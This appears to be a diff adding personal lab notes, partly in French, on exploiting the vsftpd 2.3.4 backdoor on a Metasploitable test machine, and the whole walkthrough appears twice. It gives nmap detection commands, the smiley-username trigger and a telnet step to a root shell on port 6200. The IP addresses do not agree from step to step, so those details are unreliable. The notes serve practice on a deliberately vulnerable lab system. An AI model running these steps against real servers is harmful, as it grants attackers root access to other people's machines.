@@ -1,0 +1,101 @@
+$ nmap -p21 10.0.2.4
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+
+$ nmap -p21 -sV 10.0.2.4
+PORT   STATE SERVICE VERSION                                                                                                                                                                                                               
+21/tcp open  ftp     vsftpd 2.3.4
+Service Info: OS: Unix
+
+$ locate "*vsftp*.nse"
+/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
+
+$ nmap -p21 --script ftp-vsftpd-backdoor.nse 10.0.2.4
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2011-2523  BID:48539
+|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|     Disclosure date: 2011-07-03
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+|     References:
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+|_      https://www.securityfocus.com/bid/48539
+Service Info: OS: Unix
+
+>>> Read the references and find the backdoor installer.
+
+$ ftp 10.0.2.4
+user: user:)
+pwd:  pass
+> Wait few seconds for Backdoor injection (on port 6200).
+Ctrl-C
+
+$ nmap -p6200 10.2.2.4
+PORT     STATE  SERVICE
+6200/tcp closed lm-x
+
+$ telnet 10.2.0.4 6200
+id; gives root 
+echo "Youre hacked" >> Hacked.txt; crée un fichier à la racine de la machine metaspoitable.
+
+>@
+>@##########################################################################################################################
+>@
+>@$ nmap -p21 10.0.2.4
+>@PORT   STATE SERVICE VERSION
+>@21/tcp open  ftp     vsftpd 2.3.4
+>@
+>@$ nmap -p21 -sV 10.0.2.4
+>@PORT   STATE SERVICE VERSION                                                                                                                                                                                                               
+>@21/tcp open  ftp     vsftpd 2.3.4
+>@Service Info: OS: Unix
+>@
+>@$ locate "*vsftp*.nse"
+>@/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
+>@
+>@$ nmap -p21 --script ftp-vsftpd-backdoor.nse 10.0.2.4
+>@PORT   STATE SERVICE VERSION
+>@21/tcp open  ftp     vsftpd 2.3.4
+>@| ftp-vsftpd-backdoor: 
+>@|   VULNERABLE:
+>@|   vsFTPd version 2.3.4 backdoor
+>@|     State: VULNERABLE (Exploitable)
+>@|     IDs:  CVE:CVE-2011-2523  BID:48539
+>@|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+>@|     Disclosure date: 2011-07-03
+>@|     Exploit results:
+>@|       Shell command: id
+>@|       Results: uid=0(root) gid=0(root)
+>@|     References:
+>@|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+>@|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+>@|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+>@|_      https://www.securityfocus.com/bid/48539
+>@Service Info: OS: Unix
+>@
+>@>>> Read the references and find the backdoor installer.
+>@
+>@$ ftp 10.0.2.4
+>@user: user:)
+>@pwd:  pass
+>@> Wait few seconds for Backdoor injection (on port 6200).
+>@Ctrl-C
+>@
+>@$ nmap -p6200 10.2.2.4
+>@PORT     STATE  SERVICE
+>@6200/tcp closed lm-x
+>@
+>@$ telnet 10.2.0.4 6200
+>@id; gives root 
+>@echo "Youre hacked" >> Hacked.txt; crée un fichier à la racine de la machine metaspoitable.
+>@
+>@##########################################################################################################################
+>@
